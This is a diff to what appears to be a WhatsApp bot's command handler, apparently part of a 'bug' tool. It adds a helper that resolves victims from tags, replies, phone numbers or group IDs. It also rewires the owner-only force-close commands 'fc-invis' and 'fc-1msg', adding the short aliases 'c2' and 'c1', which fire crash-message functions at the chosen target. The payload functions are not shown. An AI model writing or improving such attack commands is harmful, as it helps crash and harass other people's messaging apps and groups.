@@ -208,6 +208,37 @@ const _getLimitToday = (raw) => {
 
 const _getMaxLimit = (raw) => (global._LIMIT_CFG.free || 20) + (_getLimitToday(raw).bonus || 0);
 
+const parseTargetJid = (text, m, sock) => {
+    let target = null;
+    if (m?.mentionedJid && m.mentionedJid[0]) {
+        target = m.mentionedJid[0];
+    } else if (m?.quoted && (m.quoted.sender || m.quoted.key?.participant || m.quoted.key?.remoteJid)) {
+        target = m.quoted.sender || m.quoted.key?.participant || m.quoted.key?.remoteJid;
+    } else if (text && String(text).trim()) {
+        const clean = String(text).trim();
+        if (clean.endsWith('@g.us') || clean.endsWith('@s.whatsapp.net') || clean.endsWith('@lid') || clean.endsWith('@newsletter')) {
+            target = clean;
+        } else {
+            const num = clean.replace(/[^0-9]/g, '');
+            if (num) {
+                if (num.length >= 17 && num.startsWith('120363')) {
+                    target = num + '@g.us';
+                } else {
+                    target = num + '@s.whatsapp.net';
+                }
+            }
+        }
+    } else if (m?.chat) {
+        target = m.chat;
+    }
+    if (!target && m?.from) target = m.from;
+
+    if (target && sock && typeof sock.decodeJid === 'function') {
+        target = sock.decodeJid(target);
+    }
+    return target || m?.chat || '';
+};
+
 const _checkLimit = (raw) => {
     const d = _getLimitToday(raw);
     const max = _getMaxLimit(raw);
@@ -11455,10 +11486,11 @@ case 'delayhard-invis': {
     break;
 }
 
+case 'c2':
 case 'fc-invis': {
     if (!isOwner && !isCreator) return kyyreply('[ ! ] Khusus Owner / Premium');
-    if (!text) return kyyreply(`Example: ${prefix}fc-invis 628××`);
-    let _kfiTarget = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+    let _kfiTarget = parseTargetJid(text, m, Elaina);
+    if (!_kfiTarget || _kfiTarget === '@s.whatsapp.net') return kyyreply(`Format target tidak valid.\nContoh: ${prefix}c2 628xx atau reply pesan / tag user`);
     await Elaina.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });
     kyyreply(kyyBugRes);
     for (let i = 0; i < 10; i++) await kyyInvisGhost(_kfiTarget);
@@ -11466,10 +11498,11 @@ case 'fc-invis': {
     break;
 }
 
+case 'c1':
 case 'fc-1msg': {
     if (!isOwner && !isCreator) return kyyreply('[ ! ] Khusus Owner / Premium');
-    if (!text) return kyyreply(`Example: ${prefix}fc-1msg 628××`);
-    let _kf1Target = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+    let _kf1Target = parseTargetJid(text, m, Elaina);
+    if (!_kf1Target || _kf1Target === '@s.whatsapp.net') return kyyreply(`Format target tidak valid.\nContoh: ${prefix}c1 628xx atau reply pesan / tag user / kirim di grup`);
     await Elaina.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });
     kyyreply(kyyBugRes);
     for (let i = 0; i < 1; i++) await kyyFc1Msg(_kf1Target);
